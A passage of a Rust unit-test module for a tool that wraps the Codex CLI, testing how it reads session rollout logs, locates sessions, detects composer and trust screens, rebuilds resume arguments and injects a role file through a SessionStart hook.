        r#"{"timestamp":"2026-10-22T09:16:00.000Z","type":"event_msg","payload":{"type":"item_completed","thread_id":"019b3136-fdf0-7d50-8762-84076af7f203","turn_id":"t2","item":{"type":"UserMessage","id":"u2","content":[{"type":"text","text":"[from lead] rebase first","text_elements":[]}]}}}"#, "\n",
        r#"{"timestamp":"2026-10-22T09:16:30.000Z","type":"event_msg","payload":{"type":"item_completed","thread_id":"019b3136-fdf0-7d50-8762-84076af7f203","turn_id":"t2","item":{"type":"HookPrompt","id":"h1","fragments":[{"text":"Before you stop, report","hookRunId":"r"}]}}}"#, "\n",
        "not json\n",
    );

    #[test]
    fn the_user_turns_of_a_rollout_are_its_user_message_events_and_never_codexs_own_context() {
        let said = user_messages_at(ROLLOUT);
        assert_eq!(said, [(crate::typing::iso_millis("2026-10-22T09:15:03.000Z"), "add refunds to the billing page".to_string()), (crate::typing::iso_millis("2026-10-22T09:16:00.000Z"), "[from lead] rebase first".to_string())]);
        assert!(said.iter().all(|(at, _)| at.is_some()));
    }

    #[test]
    fn a_session_is_found_by_its_id_and_a_folders_latest_by_the_cwd_its_rollout_opens_with() {
        let home = crate::sh::test_dir("codex-rollouts");
        let day = home.join("sessions/2026/10/22");
        std::fs::create_dir_all(&day).unwrap();
        let file = day.join("rollout-2026-10-22T11-15-02-019b3136-fdf0-7d50-8762-84076af7f203.jsonl");
        std::fs::write(&file, ROLLOUT).unwrap();
        std::fs::write(day.join("rollout-2026-10-22T11-20-00-019b3137-0000-7000-8000-000000000000.jsonl"), ROLLOUT.replace("/src/wt1.app", "/src/wt2.app").replace("019b3136-fdf0-7d50-8762-84076af7f203", "019b3137-0000-7000-8000-000000000000")).unwrap();
        assert_eq!(transcript(&home, "019b3136-fdf0-7d50-8762-84076af7f203"), Some(file.clone()));
        assert_eq!(transcript(&home, "019b3136"), None, "only a whole id matches");
        let packed = day.join("rollout-2026-10-01T08-00-00-019b0000-0000-7000-8000-000000000001.jsonl.zst");
        std::fs::write(&packed, [0x28, 0xb5, 0x2f, 0xfd]).unwrap();
        assert_eq!(transcript(&home, "019b0000-0000-7000-8000-000000000001"), Some(packed.clone()), "a compressed session is still found, so it is resumed");
        assert!(compressed(&packed) && !compressed(&file));
        let epoch = std::time::UNIX_EPOCH;
        assert_eq!(latest_session(&home, Path::new("/src/wt1.app"), epoch).as_deref(), Some("019b3136-fdf0-7d50-8762-84076af7f203"));
        assert_eq!(latest_session(&home, Path::new("/src/wt3.app"), epoch), None);
        assert_eq!(latest_session(&home, Path::new("/src/wt1.app"), std::time::SystemTime::now() + std::time::Duration::from_secs(60)), None, "a conversation from before the task's branch is not the task's");
        std::fs::remove_dir_all(home).unwrap();
    }

    #[test]
    fn codexs_composer_is_read_as_empty_typed_or_unreadable() {
        let empty = "\n\x1b[1m›\x1b[22m \x1b[2mAsk Codex to do anything\x1b[22m\n\n  ? for shortcuts                       100% context left";
        assert_eq!(draft(empty), Draft::Empty, "the placeholder Codex 0.163 draws dim");
        let typed = "› add refunds\n\n  done\n\x1b[1m›\x1b[22m fix the flaky test\n  in billing\n\n                                 100% context left";
        assert_eq!(draft(typed), Draft::Typed("fix the flaky test\nin billing".to_string()), "the last prompt line is the composer; one above is history");
        assert_eq!(draft("› [Pasted Content 1005 chars]\n\n  100% context left"), Draft::Typed("[Pasted Content 1005 chars]".to_string()));
        assert_eq!(draft("› \n\n  100% context left"), Draft::Empty);
        assert_eq!(draft("Working (12s · esc to interrupt)"), Draft::Unreadable);
    }

    #[test]
    fn a_folder_counts_as_trusted_when_codexs_config_trusts_it_or_a_folder_above() {
        let config: toml::Table = "[projects.\"/home/ada/code\"]\ntrust_level = \"trusted\"\n[projects.\"/home/ada/other\"]\ntrust_level = \"untrusted\"\n".parse().unwrap();
        assert!(trusted_in(&config, Path::new("/home/ada/code/shop")));
        assert!(!trusted_in(&config, Path::new("/home/ada/other/shop")));
        assert!(!trusted_in(&toml::Table::new(), Path::new("/home/ada/code")));
        let screen = "  Trust this folder? Codex can read, edit, and run files here,\n› 1. Trust and continue\n  2. Quit";
        assert!(asks_trust(screen) && trust_selected(screen));
        assert!(!trust_selected("  1. Trust and continue\n› 2. Quit"));
        let hooks = "  Hooks need review\n  2 hooks are new or changed.\n› 1. Review hooks\n  2. Trust all and continue\n  3. Continue without trusting (hooks\n     won't run)";
        assert_eq!((SCREENS.held)(hooks), Some(Started::AwaitsHooks), "Codex 0.163's startup review of the user's own hooks is left to the user");
        assert_eq!((SCREENS.held)(screen), None);
        assert_eq!(Started::AwaitsHooks.asks(), Some("whether to trust the hooks it found new or changed"));
    }

    #[test]
    fn a_restarted_codex_keeps_its_flags_and_resumes_its_own_session() {
        let argv: Vec<String> = ["/Users/ada/.local/bin/codex", "resume", "--sandbox", "workspace-write", "-c", "plugins.kelpie@kelpie.enabled=true", "--last", "old-id"].map(str::to_string).to_vec();
        assert_eq!(resume_args(&argv, "new-id").unwrap(), ["resume", "--sandbox", "workspace-write", "-c", "plugins.kelpie@kelpie.enabled=true", "new-id"]);
        assert!(resume_args(&["codex".to_string(), "--frobnicate".to_string()], "x").unwrap_err().contains("--frobnicate"));
        assert!(resume_args(&["claude".to_string()], "x").unwrap_err().contains("not codex"));
        assert!(lacks_role(&argv), "an old trust entry does not count");
        let fixed = with_role(&argv[1..]);
        assert!(!lacks_role(&fixed) && fixed.last().map(String::as_str) == Some("old-id"), "{fixed:?}");
        assert_eq!(fixed.iter().filter(|word| *word == "plugins.kelpie@kelpie.enabled=true").count(), 1);
    }

    #[test]
    fn the_session_start_hook_records_the_session_and_gives_the_role_whole() {
        let roles = crate::sh::test_dir("codex-roles");
        std::fs::write(roles.join("billing@app.md"), "# Your role\n\nReport before you stop.\n").unwrap();
        let said: Value = serde_json::from_str(&session_start("billing@app", &json!({}), Some(&roles))).unwrap();
        assert_eq!(said["hookSpecificOutput"]["hookEventName"], "SessionStart");
        assert_eq!(said["hookSpecificOutput"]["additionalContext"], "# Your role\n\nReport before you stop.\n");
        assert_eq!(session_start("other@app", &json!({}), Some(&roles)), "", "no role file, no context");
        std::fs::remove_dir_all(roles).unwrap();
    }

    #[test]
    fn a_hook_outside_a_kelpie_task_says_nothing() {
        let outside = crate::sh::test_dir("codex-outside");
        for event in ["SessionStart", "UserPromptSubmit", "Stop"] {
            let input = json!({ "hook_event_name": event, "cwd": outside, "session_id": "s", "stop_hook_active": false }).to_string();
            assert_eq!(hook(&input), "", "{event}");
        }
        assert_eq!(hook("not json"), "");
        std::fs::remove_dir_all(outside).unwrap();
    }

    #[test]
    fn doctor_names_what_in_the_users_config_turns_kelpies_hooks_off() {
        assert!(hooks_blocked(None).is_empty());
        assert!(hooks_blocked(Some(&"model = \"x\"\n".parse().unwrap())).is_empty());
        let off: toml::Table = "[features]\nhooks = false\n[hooks.state.\"kelpie@kelpie:hooks/hooks.json:stop:0:0\"]\nenabled = false\n".parse().unwrap();
        assert_eq!(hooks_blocked(Some(&off)), ["[features] hooks = false turns every hook off", "its Stop hook is turned off in /hooks"]);
    }

    #[test]
    fn availability_names_the_binary_its_version_and_the_plugin() {
        let shown = Availability { binary: Some(PathBuf::from("/u/.local/bin/codex")), version: Some("codex-cli 0.163.0".to_string()), plugin: Installed::Current }.line();
        assert_eq!(shown, "codex-cli 0.163.0 at /u/.local/bin/codex · kelpie's plugin installed");
        assert_eq!(Availability { binary: None, version: None, plugin: Installed::Missing }.line(), "codex is not on PATH · kelpie's plugin not installed: kelpie setup codex");
    }
}
